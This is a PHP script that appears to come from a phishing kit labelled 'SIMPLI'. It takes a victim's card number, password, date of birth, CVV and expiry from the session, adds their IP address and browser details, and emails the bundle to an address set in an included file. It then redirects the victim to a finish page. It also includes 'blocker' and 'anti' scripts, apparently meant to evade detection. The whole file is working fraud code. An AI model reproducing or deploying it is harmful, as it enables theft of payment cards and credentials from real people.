<?php
session_start();
include "./youremail.php";
include "./blocker.php";
include './prevents/anti7.php';
			include './prevents/anti8.php';
				include './prevents/anti9.php';


$ip = getenv("REMOTE_ADDR");
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$timedate = date("D/M/d, Y g(idea) a");

$cc1 = $_SESSION['cardNumber'];
$pass = $_SESSION['password'];


$dob = $_SESSION['dob'];
$cvv = $_SESSION['cvv'];
$exp = $_SESSION['exp'];

$data ="
=============## SIMPLI ##=========================
|CC: $cc1
|pass: $pass

|DOB: $dob
|CVV : $cvv
|EXP : $exp
==================#####=======================
IP : $ip
UA : $browserAgent
Time : $timedate

";

$subj="##simpli ALLINFO #$ip";
if (strlen($cc1)== 16 && strlen($cvv)==3 ) {
   mail($emailusr, $subj, $data);
   
}



		

header("Location: ./finish.php");

?>